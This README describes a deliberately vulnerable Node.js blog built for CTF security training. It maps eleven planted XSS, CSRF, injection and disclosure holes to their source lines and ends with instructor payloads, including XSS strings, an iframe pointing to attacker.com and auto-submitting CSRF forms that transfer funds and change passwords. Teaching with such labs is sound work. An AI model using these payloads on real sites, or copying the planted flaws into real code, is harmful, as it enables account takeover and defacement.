# Rutosec CTF Blog

A deliberately vulnerable web application for security training.
Built with Node.js, Express, EJS, and SQLite (sql.js — no native compilation required).

## Challenges

| # | Challenge         | Sink / Location                        | Points |
|---|-------------------|----------------------------------------|--------|
| 1 | Reflected XSS     | `/search?query=` URL parameter         | 100    |
| 2 | Stored XSS        | Post comments (`/posts/:id`)           | 150    |
| 3 | DOM-Based XSS     | Hero search field (client-side)        | 100    |
| 4 | Site Defacement   | Announcements page (`/announcements`)  | 150    |
| 5 | Link Injection    | Community resources (`/labs/link-injection`) + Profile website field | 100 |
| 6 | iFrame Injection  | Media embeds (`/labs/iframe-injection`) + Post embed field | 125 |
| 7 | Info Disclosure — Server Config | Hidden page (dirbust to find) | 75 |
| 8 | Info Disclosure — Crawl Policy  | Hidden file (dirbust to find)  | 75 |
| 9 | CSRF — Simple Form | `/csrf/simple-form` (form-based, no token) | 125 |
| 10 | CSRF — AJAX Request | `/csrf/ajax-endpoint` (JSON POST, no token) | 150 |
| 11 | CSRF — Beginner Challenge | `/csrf/password-change` (one-click attack) | 100 |

**Total: 1100 points**

## Setup

### Requirements
- Node.js v16+ (tested on v25)
- npm

### Install & Run

```bash
npm install
node db/seed.js    # seeds demo users, posts, transfers, messages
node server.js     # → http://localhost:3000
```

### Demo Accounts

| Username | Password     | Role    |
|----------|--------------|---------|
| tom      | rutosec123   | admin   |
| ruben    | rutosec123   | admin   |
| alice    | student123   | student |
| bob      | student123   | student |

Students should create their own accounts via `/signup`.

## Instructor Notes

### Vulnerability Map

| Challenge         | File                            | Vulnerable code / note                              |
|-------------------|---------------------------------|-----------------------------------------------------|
| Reflected XSS     | `server.js` `/search` route     | `reflectedOutput: 'No results found for: ' + q` → template |
| Stored XSS        | `routes/posts.js` POST comment  | Comment `body` stored raw, rendered via `${c.body}` |
| DOM-Based XSS     | `public/js/main.js`             | `searchResult.innerHTML = 'No articles found: ' + val` |
| Site Defacement   | `routes/announcements.js` POST  | `body` stored raw, rendered via `${a.body}` |
| Link Injection    | `routes/labs.js` + `routes/profile.js` | `url`/`website` rendered in `<a href="${...}">` |
| iFrame Injection  | `routes/labs.js` + `routes/posts.js`   | `embed` rendered via `${e.embed}` as raw HTML |
| Info Disclosure 1 | `routes/hidden.js`              | `/phpinfo.php` — not linked, must dirbust |
| Info Disclosure 2 | `routes/hidden.js`              | `/robots.txt` — not linked, must dirbust |
| CSRF Simple Form  | `routes/csrf.js` POST           | No CSRF token check on form-based transfer POST |
| CSRF AJAX         | `routes/csrf.js` POST /ajax-endpoint | No token check on JSON endpoint — accepts credentials from any origin |
| CSRF Beginner     | `routes/csrf.js` POST /password-change | No token on password change — any cross-origin POST succeeds |

### Suggested Student Tools
- **Gobuster / ffuf / dirsearch** — discover `/phpinfo.php` and `/robots.txt`
- **Burp Suite Community Edition** — intercept, modify, and replay requests
- **Browser DevTools (F12)** — DOM inspection, network tab, source analysis
- **curl** — manual CSRF testing via command line
- **HTML file hosting** — create CSRF PoC files on a local web server

### Payloads to get started (share after the session)

**XSS Payloads:**
```
Reflected:   /search?query=<img src=x onerror=alert(1)>
Stored:      post comment: <img src=x onerror=alert(1)>
DOM:         type <img src=x onerror=alert(1)> in hero search bar
Defacement:  admin post: <style>body{background:red}</style><h1>HACKED</h1>
Link:        submit URL: javascript:alert(1)
iFrame:      submit embed: <iframe src="https://attacker.com"></iframe>
```

**CSRF Payloads:**
```html
<!-- Simple Form CSRF (auto-submit) -->
<form action="http://localhost:3000/csrf/simple-form" method="POST">
  <input name="to_user" value="attacker"/>
  <input name="amount" value="1000"/>
</form>
<script>document.forms[0].submit();</script>

<!-- AJAX CSRF with credentials -->
<script>
fetch('http://localhost:3000/csrf/ajax-endpoint', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ message: 'Your account is compromised' })
});
</script>

<!-- Password Change CSRF (one-click) -->
<form action="http://localhost:3000/csrf/password-change" method="POST">
  <input name="new_password" value="hacked123"/>
</form>
<script>document.forms[0].submit();</script>
```

### All SQL uses parameterised queries — no SQL injection surface.

---

*Rutosec CTF Blog — 11 Challenges, 1100 Points. Tom & Ruben.*
